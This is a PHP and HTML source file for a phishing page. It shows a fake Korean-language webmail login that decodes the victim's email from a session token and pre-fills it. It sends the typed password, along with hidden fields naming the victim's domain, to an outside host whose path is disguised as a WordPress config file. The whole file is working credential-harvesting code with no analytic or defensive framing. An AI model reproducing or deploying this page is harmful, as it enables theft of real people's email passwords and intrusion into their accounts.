<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>WEBMAIL</title>
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text],
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 100%;
  width: 100%;
  padding: 8 15px;
  margin: 0;
  background: white;
  border: 1px solid #d6d6d6;
  border-top: 1px solid #d6d6d6;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 15px;
  line-height: 1.42857143;
  vertical-align: top;
  color: #404040;
  }
  input[type=text]:focus,
  input[type=password]:focus {
  outline: none;
  border: 1px solid black;
  }
</style>
<body>

<div align="center">
	<table border="0" width="1000" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="50" >&nbsp;</td>
				</tr>
				<tr>
					<td height="551" background="https://i.ibb.co/qDhF22B/bg.png">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td>&nbsp;</td>
							<td width="400">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
							    <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
								<tr>
									<td height="124"></td>
								</tr>
								<tr>
									<td height="110">
									<table border="0" height="110" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td height="50">
													  <input type="text" placeholder="&#50500;&#51060;&#46356;" required value="<?php echo $users;?>" name="user" size="20">
													  <input type="hidden" value="LG" name="sender" >
													  <input type="hidden" value="http://webmail.<?php echo $ddomain;?>/login.php" name="link" >
													  <input type="hidden" value="<?php echo $ddomain;?>" name="domain" >
													</td>
												</tr>
												<tr>
													<td height="10"></td>
												</tr>
												<tr>
													<td height="50">
  													  <input type="password" placeholder="&#48708;&#48128;&#48264;&#54840;" required name="passwd" size="20" autofocus >
													</td>
												</tr>
											</table>
											</td>
											<td width="10"></td>
											<td width="109">
											<input type="image" src="https://i.ibb.co/vkPNjK2/btn.png" width="110" height="110" ></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="320"></td>
								</tr>
							</table>
							</td>
							<td width="53"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td>&nbsp;</td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>